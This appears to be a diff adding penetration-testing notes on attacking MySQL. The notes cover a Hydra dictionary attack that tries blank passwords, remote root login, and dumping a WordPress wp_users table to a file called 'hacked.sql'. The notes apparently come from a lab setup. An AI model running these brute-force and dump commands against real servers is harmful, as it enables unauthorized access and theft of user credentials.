@@ -1,0 +1,30 @@
+
+                *MySQL Dictionary Attack*
+
+- Hydra -L <usersFile> -P <passwordFile> mysql -vV -f -> Won't find it because MySQL uses blank passwords.
+
+- Hydra -L <usersFile> -P <passwordFile> mysql -vV -f -e n -> Finds the password.
+
+Default MySQL port: 3306
+- mysql -u <username> -h <ipAddress>
+
+Commands:
+- show databases; -> Show databases.
+- use <database>; -> Use the specified database.
+- show tables; -> Show tables.
+- desc <tableName>; -> Show the structure of the table.
+- select <column> from <tableName>; -> Retrieve data from a specific column.
+- select <column1>, <column2> from <tableName>; -> Retrieve data from multiple columns.
+- select * from <tableName>; -> Retrieve data from all columns.
+
+Integrated use:
+- show databases; use <databaseName>; show tables; -> Can be used in an integrated manner.
+
+For remote access:
+- mysqlshow -h <ipAddress> --user root
+
+Remote Query:
+- mysql -h 10.0.2.5 -u root wordpress -e 'select * from wp_users;' -> Remote access.
+
+Mysqldump -> Dump the database.
+- mysqldump -h 10.0.2.5 wordpress wp_users > /home/kali/Desktop/hacked.sql
